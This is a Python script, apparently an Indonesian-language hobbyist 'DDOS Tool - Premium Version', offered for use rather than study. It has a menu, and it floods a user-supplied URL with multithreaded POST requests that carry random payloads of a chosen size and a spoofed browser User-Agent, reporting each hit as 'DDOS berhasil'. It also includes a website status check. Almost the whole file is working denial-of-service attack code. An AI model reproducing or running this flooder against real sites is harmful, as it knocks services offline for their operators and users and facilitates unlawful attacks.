# ren_ddosv3.py
import os
import sys
import time
import random
import string
import requests
import threading
from colorama import Fore, init
from module import cek_status_website, cek_ssl_website, cek_dns, cek_hsts, cek_cors

# Inisialisasi colorama
init(autoreset=True)

# Fungsi untuk menampilkan teks secara bertahap
def hiasan_teks(teks):
    for huruf in teks:
        sys.stdout.write(huruf)
        sys.stdout.flush()
        time.sleep(0.05)
    print()

# Fungsi untuk membersihkan layar
def bersihkan_layar():
    os.system('cls' if os.name == 'nt' else 'clear')

# Header dengan logo ASCII
def tampilkan_logo():
    logo = '''
██████╗░██████╗░░█████╗░░██████╗██╗░░░██╗██████╗░
██╔══██╗██╔══██╗██╔══██╗██╔════╝██║░░░██║╚════██╗
██║░░██║██║░░██║██║░░██║╚█████╗░╚██╗░██╔╝░█████╔╝
██║░░██║██║░░██║██║░░██║░╚═══██╗░╚████╔╝░░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝░░╚██╔╝░░██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░░░░╚═╝░░░╚═════╝░
    '''
    print(Fore.YELLOW + logo)

# Fungsi untuk membuat payload acak
def generate_random_payload(ukuran_damage):
    return ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=ukuran_damage))

# Fungsi untuk mengirim request DDOS
def kirim_ddos(url, jumlah_ddos, ukuran_damage):
    sukses_count = 0

    def ddos_thread():
        nonlocal sukses_count
        try:
            payload = generate_random_payload(ukuran_damage)
            headers = {'User-Agent': 'Mozilla/5.0'}
            response = requests.post(url, data=payload, headers=headers)
            if response.status_code == 200:
                sukses_count += 1
                print(Fore.GREEN + f"[✔] DDOS berhasil ke {url}")
            else:
                print(Fore.RED + f"[✘] DDOS gagal, status: {response.status_code}")
        except Exception as e:
            print(Fore.RED + f"[✘] Error: {e}")

    threads = []
    for _ in range(jumlah_ddos):
        thread = threading.Thread(target=ddos_thread)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(Fore.CYAN + f"\nTotal DDOS berhasil: {sukses_count} dari {jumlah_ddos}")

# Menu utama
def main():
    while True:
        bersihkan_layar()
        tampilkan_logo()

        print(Fore.YELLOW + "╔═══════════════════════════════════════════════════╗")
        print(Fore.YELLOW + "║                DDOS Tool - Premium Version        ║")
        print(Fore.YELLOW + "╚═══════════════════════════════════════════════════╝")

        print(Fore.GREEN + "1. Lakukan DDOS")
        print(Fore.CYAN + "2. Cek status website")
        print(Fore.MAGENTA + "3. Keluar")

        pilihan = input(Fore.WHITE + "Pilih opsi (1-3): ")
        if pilihan == '1':
            url = input(Fore.YELLOW + "Masukkan URL website (dengan http/https): ")
            jumlah = int(input(Fore.YELLOW + "Masukkan jumlah DDOS: "))
            damage = int(input(Fore.YELLOW + "Masukkan ukuran damage (bytes): "))
            kirim_ddos(url, jumlah, damage)
        elif pilihan == '2':
            url = input(Fore.YELLOW + "Masukkan URL website: ")
            response = cek_status_website(url)
            if response:
                print(Fore.GREEN + f"Website {url} aktif dengan status {response.status_code}")
                input(" ")
            else:
                print(Fore.RED + f"Website {url} tidak dapat diakses.")
                input(" ")
        elif pilihan == '3':
            print(Fore.CYAN + "Keluar dari program. Sampai jumpa!")
            break
        else:
            print(Fore.RED + "Pilihan tidak valid!")

# Jalankan program utama
if __name__ == "__main__":
    main()
